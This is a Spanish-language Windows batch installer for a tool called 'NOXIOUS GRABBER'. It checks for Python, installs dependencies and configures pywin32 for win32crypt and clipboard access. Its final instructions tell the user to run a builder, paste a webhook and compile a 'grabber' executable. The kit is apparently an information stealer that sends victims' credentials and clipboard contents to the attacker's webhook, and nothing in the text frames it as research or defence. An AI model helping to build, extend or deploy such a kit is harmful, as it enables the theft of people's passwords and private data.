@echo off
setlocal enabledelayedexpansion
title NOXIOUS GRABBER - Instalador
color 0A
chcp 65001 >nul 2>&1

echo ========================================================
echo   NOXIOUS GRABBER - Instalador Automatico
echo   Python 3.10+ ^| Windows 10/11
echo ========================================================
echo.

:: Ir a la carpeta del .bat (maneja ruta con espacios "NOXIOUS GRABBER")
cd /d "%~dp0"

:: 1. Verificar Python
echo [1/5] Verificando Python...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo   [!] 'python' no encontrado, probando 'py' launcher...
    py --version >nul 2>&1
    if %errorlevel% neq 0 (
        echo.
        echo   [ERROR] Python no esta instalado o no esta en el PATH.
        echo   Descarga Python 3.10+ de https://www.python.org/downloads/
        echo   ^! Marca "Add python.exe to PATH" durante la instalacion.
        echo.
        pause
        exit /b 1
    ) else (
        set "PYCMD=py"
        for /f "tokens=*" %%v in ('py --version 2^>^&1') do echo   Encontrado: %%v
    )
) else (
    set "PYCMD=python"
    for /f "tokens=*" %%v in ('python --version 2^>^&1') do echo   Encontrado: %%v
)
echo   OK.
echo.

:: 2. Verificar pip
echo [2/5] Verificando pip...
%PYCMD% -m pip --version >nul 2>&1
if %errorlevel% neq 0 (
    echo   pip no encontrado, instalando con ensurepip...
    %PYCMD% -m ensurepip --upgrade
    if %errorlevel% neq 0 (
        echo   [ERROR] No se pudo instalar pip.
        pause
        exit /b 1
    )
)
echo   OK.
echo.

:: 3. Actualizar pip, setuptools, wheel
echo [3/5] Actualizando pip / setuptools / wheel...
%PYCMD% -m pip install --upgrade pip setuptools wheel
if %errorlevel% neq 0 (
    echo   [AVISO] No se pudo actualizar pip, continuando de todos modos...
)
echo.

:: 4. Instalar dependencias de requirements.txt
echo [4/5] Instalando dependencias desde requirements.txt...
if not exist "requirements.txt" (
    echo   [ERROR] No se encontro requirements.txt en %~dp0
    pause
    exit /b 1
)
%PYCMD% -m pip install -r requirements.txt
if %errorlevel% neq 0 (
    echo.
    echo   [ERROR] Fallo la instalacion de requirements.txt
    echo   Intenta manualmente: %PYCMD% -m pip install -r requirements.txt
    echo   Revisa build.log si existe.
    pause
    exit /b 1
)
echo   Dependencias instaladas correctamente.
echo.

:: 5. Post-instalacion pywin32 (necesario para win32crypt / win32clipboard)
echo [5/5] Configurando pywin32...
%PYCMD% -c "import win32crypt" >nul 2>&1
if %errorlevel% equ 0 (
    echo   pywin32 OK.
) else (
    echo   pywin32 no cargado, ejecutando postinstall...
    rem Buscar pywin32_postinstall.py
    for /f "delims=" %%i in ('%PYCMD% -c "import sysconfig; print(sysconfig.get_path('scripts'))" 2^>nul') do set "SCRIPTPATH=%%i"
    if exist "%SCRIPTPATH%\pywin32_postinstall.py" (
        %PYCMD% "%SCRIPTPATH%\pywin32_postinstall.py" -install >nul 2>&1
        echo   pywin32 postinstall ejecutado.
    ) else (
        %PYCMD% -c "import pywin32_postinstall; pywin32_postinstall.install()" >nul 2>&1
        if %errorlevel% equ 0 (
            echo   pywin32 postinstall ejecutado via modulo.
        ) else (
            echo   [AVISO] No se pudo auto-ejecutar pywin32_postinstall.py
            echo   Si ves 'ModuleNotFoundError: win32crypt' ejecuta manualmente:
            echo   %PYCMD% Scripts\pywin32_postinstall.py -install
        )
    )
)
echo.

echo ========================================================
echo   INSTALACION COMPLETADA
echo ========================================================
echo.
echo   Para compilar:
echo     1. Ejecuta:  %PYCMD% builder.py
echo     2. Pega tu WEBHOOK y haz clic en BUILD EXECUTABLE
echo     3. El EXE se generara en NOXIOUS_Grabber.exe (NO se auto-ejecuta)
echo.
echo   Si PyInstaller da error ordinal 380:
echo     - Marca "Modo compatibilidad (sin ventana)" y recompila
echo     - O ejecuta este instalador de nuevo con opcion REPARAR
echo.
echo   Documentacion: README.md
echo ========================================================
echo.
pause
endlocal
